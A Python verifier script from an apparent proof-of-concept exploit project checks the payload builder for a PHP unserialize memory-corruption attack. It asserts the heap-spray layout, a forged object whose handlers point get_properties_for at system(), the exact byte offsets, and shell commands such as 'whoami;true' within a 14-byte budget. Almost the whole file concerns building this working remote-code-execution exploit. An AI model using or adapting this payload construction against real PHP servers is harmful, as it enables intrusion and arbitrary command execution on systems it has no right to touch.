#!/usr/bin/env python3 -I
"""Structure verifier for fire.py's build_fire_payload (offline; no lab needed).

Asserts the forged fire envelope: the var_hash spray wrapper (a:N:{...} with
c_part first + spray_count sprays + trailing R:ref), and the forged-object bytes
inside each spray slot (stale bucket zval, gc-header command with the 0x09 prefix,
ce / handlers / properties, get_properties_for=system at gpf_off). Also the <=14B
command budget and the ';true' exit0 wrap.

    python3 -I poc/primitives/dispatch/verify_fire.py
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.dispatch import fire as F  # noqa: E402

CE, SYS, SPRAY = 0x7f0000c0ffee, 0x7f00005a1230, 0x7f0000abc000
SPRAY_LEN, SPRAY_COUNT, GPF = 280, 4, 200
C_PART = 'C:10:"CachedData":3:{i:0;}'
REF_BASE = 4


def q(b, o):
    return struct.unpack_from("<Q", b, o)[0]


def extract_spray(payload, idx):
    """Pull the raw spray buffer out of serialized element i:<idx+1>."""
    tag = ('i:%d;s:%d:"' % (idx + 1, SPRAY_LEN)).encode()
    p = payload.find(tag)
    assert p >= 0, tag
    start = p + len(tag)
    return payload[start:start + SPRAY_LEN]


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True

    print("## envelope structure (exit0_wrap off)")
    pl = F.build_fire_payload(CE, SYS, SPRAY, b"id", GPF, spray_len=SPRAY_LEN,
                              spray_count=SPRAY_COUNT, c_part=C_PART,
                              ref_base=REF_BASE, exit0_wrap=False)
    total = 1 + SPRAY_COUNT + 1
    ok &= check("starts a:%d:{ and ends }" % total,
                pl.startswith(('a:%d:{' % total).encode()) and pl.endswith(b'}'))
    ok &= check("i:0 carries c_part", ('i:0;' + C_PART).encode() in pl)
    ok &= check("spray_count spray parts present",
                pl.count(('s:%d:"' % SPRAY_LEN).encode()) == SPRAY_COUNT)
    ok &= check("trailing R:ref_base", ('R:%d;' % REF_BASE).encode() in pl)

    print("## forged object bytes inside a spray slot")
    sp = extract_spray(pl, 0)
    ok &= check("len(spray) = spray_len", len(sp) == SPRAY_LEN)
    fake_obj = SPRAY + 104
    ok &= check("stale bucket zval.value@40 = spray_addr+104", q(sp, 40) == fake_obj)
    ok &= check("stale bucket zval.type@48 = 0x08 (OBJECT)",
                struct.unpack_from("<I", sp, 48)[0] == 0x08)
    ok &= check("gc header@104 = 0x09 + cmd (no exit0 wrap)",
                bytes(sp[104:104 + 3]) == b"\x09id" and sp[104 + 3] == 0)
    ok &= check("fake_obj.ce@120 = ce", q(sp, 120) == CE)
    ok &= check("fake_obj.handlers@128 = spray_addr", q(sp, 128) == SPRAY)
    ok &= check("fake_obj.properties@136 = 1", q(sp, 136) == 1)
    ok &= check("handlers[gpf_off=%d] = system" % GPF, q(sp, GPF) == SYS)

    print("## exit0_wrap appends ';true' when it fits")
    plw = F.build_fire_payload(CE, SYS, SPRAY, b"id", GPF, spray_len=SPRAY_LEN,
                               spray_count=SPRAY_COUNT, c_part=C_PART,
                               ref_base=REF_BASE, exit0_wrap=True)
    spw = extract_spray(plw, 0)
    ok &= check("gc header = 0x09 + 'id;true'", bytes(spw[104:104 + 8]) == b"\x09id;true")

    print("## str command accepted; exit0 budget respected (no overflow append)")
    pls = F.build_fire_payload(CE, SYS, SPRAY, "whoami;true", GPF, spray_len=SPRAY_LEN,
                               spray_count=SPRAY_COUNT, c_part=C_PART,
                               ref_base=REF_BASE, exit0_wrap=True)
    sps = extract_spray(pls, 0)
    ok &= check("already-;true command not double-wrapped",
                bytes(sps[104:104 + 12]) == b"\x09whoami;true")

    print("## 14-byte command cap enforced")
    try:
        F.build_fire_payload(CE, SYS, SPRAY, b"X" * 15, GPF, spray_len=SPRAY_LEN,
                             spray_count=SPRAY_COUNT, c_part=C_PART,
                             ref_base=REF_BASE, exit0_wrap=False)
        capped = False
    except AssertionError:
        capped = True
    ok &= check("15-byte command raises AssertionError", capped)

    print("\n==== verify_fire: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
